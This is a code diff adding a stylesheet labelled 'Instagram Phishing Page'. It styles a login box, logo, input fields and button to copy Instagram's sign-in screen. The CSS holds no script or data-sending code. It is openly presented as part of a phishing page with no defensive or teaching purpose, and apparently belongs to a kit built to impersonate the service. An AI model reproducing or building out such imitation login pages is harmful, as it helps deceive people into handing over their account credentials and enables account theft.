@@ -1,0 +1,58 @@
+/* Instagram Phishing Page */
+body {
+    font-family: Arial, sans-serif;
+    background: #fafafa;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.login-box {
+    background: #fff;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    padding: 20px 40px;
+    width: 350px;
+    text-align: center;
+}
+
+.logo {
+    font-family: 'Billabong', cursive;
+    font-size: 48px;
+    margin: 20px 0;
+    color: #262626;
+}
+
+input {
+    width: 100%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #dbdbdb;
+    border-radius: 3px;
+    background: #fafafa;
+    box-sizing: border-box;
+}
+
+button {
+    background: #0095f6;
+    color: white;
+    border: none;
+    padding: 8px;
+    width: 100%;
+    border-radius: 4px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #0080e5;
+}
+
+.footer {
+    margin-top: 20px;
+    color: #8e8e8e;
+    font-size: 12px;
+}
